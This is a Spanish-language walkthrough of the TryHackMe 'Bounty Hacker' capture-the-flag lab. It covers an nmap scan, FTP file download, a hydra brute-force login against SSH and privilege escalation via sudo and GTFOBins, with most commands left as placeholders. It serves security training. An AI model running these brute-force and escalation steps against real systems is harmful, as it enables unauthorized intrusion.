
# TryHackMe - Bounty Hacker

## Paso 1: Escaneo de la máquina objetivo
Utiliza `nmap` para identificar servicios y puertos abiertos en la máquina objetivo.

```bash
nmap <IP>
```

## Paso 2: Acceso al servicio FTP
Conecta al servicio FTP y explora los archivos disponibles.

```bash
ftp 10.10.2.220
```

1. Descarga los archivos disponibles en el servidor FTP:
   ```bash
   get <nombre_archivo>
   ```
   Asegúrate de guardar ambos archivos en tu sistema.

## Paso 3: Intentar acceso al SSH con las credenciales obtenidas
Utiliza los archivos descargados para intentar acceder al servicio SSH. Usaremos `hydra` para fuerza bruta.

```bash
hydra -l lin -P Downloads/locks.txt 10.10.2.220 ssh
```

Una vez identificadas las credenciales correctas, conecta al servidor SSH:

```bash
ssh lin@10.10.2.220
```

## Paso 4: Encontrar la primera bandera
Explora el sistema para encontrar la primera flag. Usa comandos como `ls`, `cat`, o `find` si es necesario.

```bash
cat <flag_file>
```

## Paso 5: Escalada de privilegios
Comprueba tus permisos actuales y busca posibles vulnerabilidades para escalar privilegios.

1. Ejecuta:
   ```bash
   sudo -l
   ```
2. Copia el resultado y busca la vulnerabilidad en [GTFOBins](https://gtfobins.github.io/).

3. Ejecuta el comando proporcionado para escalar privilegios y convertirte en `root`.

```bash
<comando_de_escalada>
```

4. Verifica tu nuevo nivel de privilegios:
   ```bash
   whoami
   ```

## Paso 6: Encontrar la última bandera
Utiliza `locate` o `find` para buscar y leer la última flag.

```bash
locate <flag_file>
cat <flag_file>
```
